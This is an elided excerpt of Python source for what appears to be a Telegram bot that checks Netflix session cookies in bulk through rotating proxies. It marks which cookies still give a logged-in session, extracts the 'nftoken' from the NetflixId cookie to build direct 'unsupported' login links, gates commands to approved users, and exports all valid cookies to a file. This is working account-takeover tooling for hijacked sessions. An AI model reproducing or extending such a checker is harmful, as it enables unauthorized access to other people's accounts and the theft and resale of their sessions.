...
def extract_nftoken(cookie_str: str) -> Optional[str]:
    """Extract ct parameter from NetflixId value for unsupported login link"""
    cookie_dict = parse_cookie(cookie_str)
    netflix_id = cookie_dict.get('NetflixId')
    if not netflix_id:
        return None
    # Parse the value which is like v=3&ct=...&pg=...&ch=...
    params = {}
...
class NetflixChecker:
    ...
    async def check_single_cookie(cookie: str) -> Dict:
        ...
        proxies_to_try = []
        if USE_PROXY:
            for _ in range(min(3, len(_all_proxies))):
                p = get_random_proxy()
                            ...
                            if "logout" in html_lower:
                                ...
                                if 'netflix' in html_lower and 'sign in' not in html_lower:
                                    if "whoops" in html_lower or "sorry" in html_lower:
                                        ...
                                        if "profile" in html_lower or "avatar" in html_lower:
                                            logged_in = True
                                        else:
                                            logged_in = False
                                else:
...
async def proxy_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    msg = f"🌐 *Proxy Status*\n\nStatus: {status}\nProxies: {proxy_count}\n\nFirst 5 proxies:\n"
    if _all_proxies:
        msg += "\n".join([f"• {p}" for p in _all_proxies[:5]])
    else:
...
async def check_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if result.get("valid"):
        ...
        if nftoken:
            link = f"https://netflix.com/unsupported?nftoken={nftoken}"
            response += f"\n⚡ *Direct Login Link:*\n`{link}`\n(Open on Android/TV/iOS browser)"
        else:
            response += "\n⚠️ Could not extract nftoken for login link."
        response += f"\n\n🆔 `{cookie_id[:8]}`"
    else:
...
async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate unsupported login link for a valid cookie"""
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Not approved.")
        return
    ...
    if cookie_doc.get("status") != "valid":
        await update.message.reply_text("❌ Cookie is not valid (status: {})".format(cookie_doc.get("status")))
        return
    # Restore original cookie string (with newlines)
    raw = denormalize_cookie(cookie_doc.get("cookie", ""))
    nftoken = extract_nftoken(raw)
    if not nftoken:
        await update.message.reply_text("❌ Could not extract nftoken from this cookie (NetflixId missing ct).")
        return
    link = f"https://netflix.com/unsupported?nftoken={nftoken}"
    await update.message.reply_text(
        f"⚡ *Direct Login Link*\n\n"
        ...
        f"Open this link on your Android, TV, or iOS browser to login:\n"
        f"`{link}`\n\n"
        f"Works for device activation.",
        parse_mode="Markdown"
    )
...
async def admin_export(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    with open(filepath, 'w', encoding='utf-8') as f:
        ...
        for cookie in cookies:
            # cookie['cookie'] is already normalized (newlines replaced with \n)
            f.write(f"{cookie['cookie']}\n")
    with open(filepath, 'rb') as f:
        await update.message.reply_document(
            document=f,
            filename=filename,
            caption=f"✅ {len(cookies)} valid cookies exported. Each cookie is one line."
        )
    os.remove(filepath)
